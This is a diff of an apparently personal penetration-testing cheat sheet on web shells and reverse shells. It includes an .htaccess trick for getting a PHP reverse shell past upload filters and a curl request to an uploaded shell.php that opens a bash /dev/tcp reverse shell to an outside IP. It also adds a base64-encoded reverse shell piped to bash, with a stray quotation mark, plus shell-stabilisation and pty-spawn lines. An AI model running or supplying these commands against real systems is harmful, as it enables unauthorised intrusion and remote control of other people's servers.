@@ -8,13 +8,8 @@
 ### <ins>Quick Note</ins>
 
 ```
-If you have the ability to upload to a site a php reverse shell, but it doesn't like .php extension, another options is to do this first:
-
-echo "AddType application/x-httpd-php .dork" > .htaccess
-
-
+Shell cleanup
 ------
-
 
 Some people have luck using this to provide a cleaner shell, etc...doesn't seem to always work. At least use rlwrap with nc, if nothing else.
 
@@ -23,6 +18,8 @@ Then do this:
 
 ctrl+z
 # for zsh
+echo $TERM
+stty -a 
 stty raw -echo; fg; reset
 stty columns 200 rows 200
 export PATH=/bin:/usr/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/sbin:/usr/games:/tmp
@@ -33,10 +30,8 @@ Also do this:
 
 alias ll='clear ; ls -lsaht --color=auto'
 
-
-
----Old
 echo $TERM && tput lines && tput cols
+
 
 # for bash
 stty raw -echo
@@ -45,6 +40,12 @@ reset
 export SHELL=bash
 
 
+
+Other Notes:
+
+If you have the ability to upload to a site a php reverse shell, but it doesn't like .php extension, another options is to do this first:
+
+echo "AddType application/x-httpd-php .dork" > .htaccess
 
 ```
 ### <ins>WEB SHELLS</ins>
@@ -286,6 +287,12 @@ Base One-liner for URL RCE + Encoded
 
 curl -k http://192.168.220.52/cmsms/uploads/shell.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.45.225%2F4444%200%3E%261%22
 
+
+Base64 encode
+---
+
+echo YmFzaCAtaT4mIC9kZXYvdGNwLzE5Mi4xNjEuMTEuMi81NDMyMSAwPiYxCg==|base64 -d"|bash
+
 ```
 #### RUBY
 
@@ -347,6 +354,7 @@ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x8
 Spawn shells
 
 - Python: `python -c 'import pty; pty.spawn("/bin/sh")'`
+- Python3: `python3 -c 'import pty; pty.spawn("/bin/sh")'`
 - Bash: `echo os.system('/bin/bash')`
 - Bash: `/bin/sh -i`
 - Bash: `script -qc /bin/bash /dev/null`
